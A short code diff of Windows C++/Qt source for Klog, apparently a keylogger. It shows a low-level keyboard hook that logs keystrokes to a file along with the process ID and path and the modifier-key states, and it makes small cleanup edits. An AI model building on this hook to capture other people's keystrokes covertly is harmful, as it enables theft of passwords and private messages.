@@ -53,6 +53,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             //Open log file
             if ( ! Klog::instance().logFile->open(QIODevice::Append | QIODevice::Text) )
                 qDebug () << "Cannot create log file";
+
             QTextStream log(Klog::instance().logFile);
 
             //Get process ID and thread ID
@@ -92,8 +93,8 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
                 while(driveLetter <= 'Z')
                 {
                     TCHAR szDeviceName[3] = {driveLetter, ':', '\0'};
-                    szTarget[512] = {0};
-                    //Get driver letters of device names
+                    //szTarget[512] = {0};
+                    //Get drive letters of device names
                     if(QueryDosDevice(szDeviceName, szTarget, 511) != 0)
                     {
                         if(wcsncmp(procPath, szTarget, wcslen(szTarget)) == 0)
@@ -155,7 +156,6 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
                 default:
 
                 //Check Shift and CapsLock state
-                //bool isDownShift = ((GetAsyncKeyState (VK_LSHIFT) & 0x80) == 0x80 ? true : false);
                 bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                 bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                 bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
